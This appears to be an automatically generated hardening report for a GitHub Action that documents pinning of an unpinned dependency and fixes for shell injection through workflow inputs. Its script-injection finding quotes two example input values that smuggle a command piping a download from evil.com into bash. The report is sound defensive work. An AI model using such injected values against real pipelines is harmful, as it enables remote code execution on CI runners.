<!-- markdownlint-disable -->

# Hardening Report: 1sgtpepper--scieqlint/v1.1.0

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `2`

Action **1sgtpepper--scieqlint/v1.1.0** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

The action uses `actions/setup-python@v6` with a mutable tag (`v6`) instead of a pinned 40-character commit SHA. This is vulnerable to supply-chain attacks if the tag is moved to a different commit.

Locations:

- `action.yml:22`

### script-injection (severity: high)

Two `run:` blocks directly interpolate `${{ inputs.* }}` expressions into shell commands (rule a), allowing an attacker who controls the calling workflow's inputs to inject arbitrary shell commands.

1. Line 27: `run: python -m pip install "scieqlint==${{ inputs.package-version }}"` — `inputs.package-version` is interpolated directly into the shell string. A value like `1.0.0" && curl https://evil.com | bash #` would execute arbitrary code.

2. Line 30: `run: scieqlint ${{ inputs.args }}` — `inputs.args` is interpolated directly and unquoted into the shell command. A value like `; curl https://evil.com | bash` would execute arbitrary code.

Fix: Route inputs through `env:` variables and double-quote them in the shell script, e.g.:
```yaml
env:
  PACKAGE_VERSION: ${{ inputs.package-version }}
  ARGS: ${{ inputs.args }}
run: |
  python -m pip install "scieqlint==$PACKAGE_VERSION"
  scieqlint $ARGS
```

Locations:

- `action.yml:27`
- `action.yml:30`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.package-version }}" appears directly in run: block of step "Install SciEqLint"; move to env: map

Locations:

- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.args }}" appears directly in run: block of step "Run SciEqLint"; move to env: map

Locations:

- `action.yml:31`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

Fixed three categories of findings in hardened/action/action.yml:
1. Pinned `actions/setup-python@v6` to full commit SHA `ece7cb06caefa5fff74198d8649806c4678c61a1` with `# v6` comment for readability.
2. Moved `${{ inputs.package-version }}` into an `env:` block as `PACKAGE_VERSION` and referenced it as `$PACKAGE_VERSION` in the pip install command.
3. Moved `${{ inputs.args }}` into an `env:` block as `INPUT_ARGS` and tokenized it via xargs into a bash array (`args=()`), using the guarded xargs loop pattern to correctly handle whitespace-separated CLI arguments (e.g., the default `check .`) while preventing shell injection.

